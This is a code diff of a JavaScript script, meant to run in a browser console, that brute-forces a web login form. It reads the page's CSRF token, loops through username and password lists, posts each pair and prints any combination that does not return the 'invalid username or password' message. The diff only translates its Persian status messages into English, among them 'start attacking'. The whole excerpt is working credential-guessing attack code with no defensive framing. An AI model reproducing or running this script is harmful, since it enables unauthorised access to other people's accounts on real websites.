@@ -14,9 +14,9 @@ const tokenElement = document.querySelector('[name=csrfmiddlewaretoken]');
 const csrfToken = tokenElement ? tokenElement.value : null;
 
 if (!csrfToken) {
-    console.log("خطا: توکن امنیتی پیدا نشد! مطمئن شو که در صفحه لاگین هستی.");
+    console.log("error!");
 } else {
-    console.log("توکن با موفقیت پیدا شد، شروع حمله...");
+    console.log("token found, start attacking...");
 
     usernames.forEach(user => {
         passwords.forEach(pass => {
@@ -32,13 +32,13 @@ if (!csrfToken) {
             .then(async res => {
                 const responseText = await res.text();
         
-                if (!responseText.includes('نام کاربری یا رمز عبور نامعتبر است.')) {
+                if (!responseText.includes('invalid username or password')) {
                     console.log("%c********************************", "color: yellow; font-weight: bold;");
-                    console.log(`%c[+] پیدا شد! یوزرنیم: ${user} | پسورد: ${pass}`, "color: lime; font-size: 15px; font-weight: bold;");
+                    console.log(`%c[+] username: ${user} | password: ${pass}`, "color: lime; font-size: 15px; font-weight: bold;");
                     console.log("%c********************************", "color: yellow; font-weight: bold;");
                 }
             })
-            .catch(err => console.log("خطا در شبکه:", err));
+            .catch(err => console.log("error in network", err));
         });
     });
 }
